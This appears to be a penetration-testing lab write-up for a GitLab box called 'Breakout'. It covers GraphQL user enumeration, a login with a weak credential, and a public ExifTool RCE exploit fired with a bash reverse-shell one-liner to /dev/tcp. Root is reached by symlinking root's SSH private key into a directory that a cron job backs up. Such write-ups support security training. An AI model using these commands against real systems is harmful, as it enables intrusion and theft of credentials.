---
icon: ubuntu
---

# Breakout - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
# Nmap TCP
Nmap scan report for 192.168.137.182
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 54 disallowed entries (15 shown)
| / /autocomplete/users /autocomplete/projects /search 
| /admin /profile /dashboard /users /help /s/ /-/profile /-/ide/ 
|_/*/new /*/edit /*/raw
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://192.168.137.182/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   24.47 ms 192.168.45.1
2   24.43 ms 192.168.45.254                                                                                                                         
3   24.49 ms 192.168.251.1                                                                                                                          
4   24.58 ms 192.168.137.182
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2731).png" alt=""><figcaption></figcaption></figure>

I can't seem to register a user and directory busting hasn't lead me anywhere. Searching for Gitlab exploits/enumeration I came across this [**Post**](https://www.rapid7.com/blog/post/2022/03/03/cve-2021-4191-gitlab-graphql-api-user-enumeration-fixed/) on Rapid7 delivering a POC on how to enumerate GitLab Unauthenticated

{% embed url="https://www.rapid7.com/blog/post/2022/03/03/cve-2021-4191-gitlab-graphql-api-user-enumeration-fixed/" %}

The `/-/graphql-explorer` endpoint mentioned in the post is available!

<figure><img src="../../.gitbook/assets/image (2732).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">GraphQL Enumeration</mark>

```graphql
{ __schema { queryType { name, fields { name, description } } } }
```

<figure><img src="../../.gitbook/assets/image (2733).png" alt=""><figcaption></figcaption></figure>

The users field is available as mentioned in the rapid7 blog posts let's use the query provided in the blog post

```graphql
{ users { nodes { id name username } } }
```

<figure><img src="../../.gitbook/assets/image (2734).png" alt=""><figcaption></figcaption></figure>

This reveals 2 users `Coaran` and `Michelle`

Michelle use the same password as her username which allows us to login as her

```bash
michelle:michelle
```

<figure><img src="../../.gitbook/assets/image (2735).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">GitLab V13.9.1 RCE</mark>

<figure><img src="../../.gitbook/assets/image (2736).png" alt=""><figcaption></figcaption></figure>

The help section reveals the version currently running! Searching for exploits I come across an RCE available on Github

{% embed url="https://github.com/CsEnox/Gitlab-Exiftool-RCE" %}

```bash
git clone https://github.com/CsEnox/Gitlab-Exiftool-RCE.git
```

{% code overflow="wrap" %}
```bash
python3 exploit.py -u michelle -p michelle -c "bash -c 'bash -i >& /dev/tcp/192.168.45.190/80 0>&1'" -t http://192.168.137.182
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2737).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (2739).png" alt=""><figcaption></figcaption></figure>

Manual Enumeration lead me nowhere. And this is beginning to look like a docker container the 2 users we found earlier are not in the passwd file and `ifconfig` and `ip a` commands do not work

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (2738).png" alt=""><figcaption></figcaption></figure>

Linpeas revealed locations for potential ssh keys!

```
/var/opt/gitlab/backups
```

<figure><img src="../../.gitbook/assets/image (2740).png" alt=""><figcaption></figcaption></figure>

Let's save this key give it the correct permissions and see if it works for one of the 2 users we discovered earlier in the GraphQL dumb.&#x20;

This key actually works for the user coaran

<figure><img src="../../.gitbook/assets/image (2741).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2742).png" alt=""><figcaption></figcaption></figure>

if you check `ifconfig` you will see that we were actually in a docker container earlier&#x20;

<figure><img src="../../.gitbook/assets/image (2743).png" alt=""><figcaption></figcaption></figure>

I was wondering why some commands did not work especially ifconfig or ip a

<figure><img src="../../.gitbook/assets/image (2744).png" alt=""><figcaption></figcaption></figure>

We also are able to see coaran user here!

### <mark style="color:$primary;">Pspy</mark>

<figure><img src="../../.gitbook/assets/image (2745).png" alt=""><figcaption></figcaption></figure>

running pspy on the machine reveals a process running a bash script in the background as the root user. Let's take a look at it

<figure><img src="../../.gitbook/assets/image (2746).png" alt=""><figcaption></figcaption></figure>

The `coaron` user does not have read or write access in the `/srv/gitlab/logs` directory, but the `git` user on the Docker container can!

<figure><img src="../../.gitbook/assets/image (2747).png" alt=""><figcaption></figcaption></figure>

I am going to pick the `gitaly` directory and place a symlink there that points toward the `root` user's private SSH key

```bash
ln -s /root/.ssh/id_rsa root_id_rsa
```

<figure><img src="../../.gitbook/assets/image (2748).png" alt=""><figcaption></figcaption></figure>

Now we just need to wait for the cronjob to run the script as the root user. After it does, then copy the the new created zipfolder from the /opt/backups directory unzip it, grab the SSH private key and use it to ssh as root.

```bash
cp /opt/backups/log_backup.zip .
unzip log_backup.zip
```

<figure><img src="../../.gitbook/assets/image (2749).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2750).png" alt=""><figcaption></figcaption></figure>
